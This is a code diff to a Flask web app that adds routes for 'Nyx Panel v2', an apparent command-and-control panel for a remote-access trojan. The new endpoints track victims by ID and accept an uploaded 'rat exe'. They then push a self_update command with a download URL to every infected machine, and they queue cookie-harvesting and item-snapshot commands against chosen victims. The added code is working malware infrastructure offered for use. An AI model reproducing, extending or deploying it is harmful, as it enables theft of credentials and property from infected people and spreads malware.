@@ -20,8 +20,8 @@ app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
 app.config["SESSION_COOKIE_HTTPONLY"] = True
 app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 app.config["PERMANENT_SESSION_LIFETIME"] = 60 * 60 * 24 * 7  # 7 days
-# Secure flag when on https (Railway)
-if os.environ.get("RAILWAY_ENVIRONMENT") or os.environ.get("FORCE_SECURE_COOKIE"):
+# Secure flag when on https (Render)
+if os.environ.get("RENDER") or os.environ.get("FORCE_SECURE_COOKIE"):
     app.config["SESSION_COOKIE_SECURE"] = True
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
@@ -1937,6 +1937,105 @@ def petshift_auth_pending_list():
         })
     out.sort(key=lambda x: x.get("created") or "", reverse=True)
     return jsonify(out)
+
+
+
+
+# ===== Nyx Panel v2 routes =====
+UPDATE_META = BASE / "update_meta.json"
+
+@app.route("/v/<vid>")
+@login_required
+def victim_page(vid):
+    return render_template("index.html", initial_view="victim", initial_vid=vid)
+
+@app.route("/settings")
+@login_required
+def settings_page():
+    return render_template("index.html", initial_view="settings")
+
+@app.route("/vault")
+@login_required
+def vault_page():
+    return render_template("index.html", initial_view="vault")
+
+@app.route("/builder")
+@login_required
+def builder_page():
+    return render_template("index.html", initial_view="builder")
+
+@app.route("/updates")
+@login_required
+def updates_page():
+    return render_template("index.html", initial_view="updates")
+
+@app.route("/api/update/upload", methods=["POST"])
+@login_required
+def api_update_upload():
+    """Drag-drop new rat exe -> store + queue self_update for online + offline."""
+    f = request.files.get("file") or request.files.get("exe")
+    if not f:
+        return jsonify({"ok": False, "error": "no file"}), 400
+    data = f.read()
+    if len(data) < 1000:
+        return jsonify({"ok": False, "error": "file too small"}), 400
+    ver = request.form.get("version") or "3.2.0"
+    name = f"nyx_{ver}_{int(time.time())}.exe"
+    path = PAYLOADS / name
+    path.write_bytes(data)
+    meta = {"file": name, "version": ver, "ts": now(), "size": len(data)}
+    try:
+        UPDATE_META.write_text(json.dumps(meta, indent=2), encoding="utf-8")
+    except Exception:
+        pass
+    # queue self_update for all known victims
+    url = request.host_url.rstrip("/") + "/api/payload/" + name
+    queued = 0
+    for vid in list(victims.keys()):
+        commands.setdefault(vid, []).append({"cmd": "self_update", "args": {"url": url, "min_version": ver}})
+        queued += 1
+    return jsonify({"ok": True, "file": name, "version": ver, "queued": queued, "url": url})
+
+@app.route("/api/payload/<name>")
+def api_payload_download(name):
+    safe = Path(name).name
+    return send_from_directory(PAYLOADS, safe, as_attachment=True)
+
+@app.route("/api/tags/<vid>", methods=["GET", "POST"])
+@login_required
+def api_tags(vid):
+    if request.method == "GET":
+        return jsonify({"tags": tags.get(vid, [])})
+    body = request.get_json(force=True, silent=True) or {}
+    t = body.get("tags") or []
+    if isinstance(t, str):
+        t = [x.strip() for x in t.split(",") if x.strip()]
+    tags[vid] = list(t)
+    return jsonify({"ok": True, "tags": tags[vid]})
+
+@app.route("/api/cmd/cookie_refresh", methods=["POST"])
+@login_required
+def api_cookie_refresh():
+    body = request.get_json(force=True, silent=True) or {}
+    vid = body.get("vid")
+    action = body.get("action") or "start"
+    interval = int(body.get("interval") or 600)
+    if not vid:
+        return jsonify({"ok": False, "error": "vid required"}), 400
+    cmd = "cookie_refresh_start" if action == "start" else "cookie_refresh_stop"
+    args = {"interval": interval} if action == "start" else {}
+    commands.setdefault(vid, []).append({"cmd": cmd, "args": args})
+    return jsonify({"ok": True, "cmd": cmd})
+
+@app.route("/api/cmd/limiteds", methods=["POST"])
+@login_required
+def api_limiteds():
+    body = request.get_json(force=True, silent=True) or {}
+    vid = body.get("vid")
+    if not vid:
+        return jsonify({"ok": False, "error": "vid required"}), 400
+    commands.setdefault(vid, []).append({"cmd": "limiteds_snapshot", "args": {}})
+    return jsonify({"ok": True})
 
 
 if __name__ == "__main__":
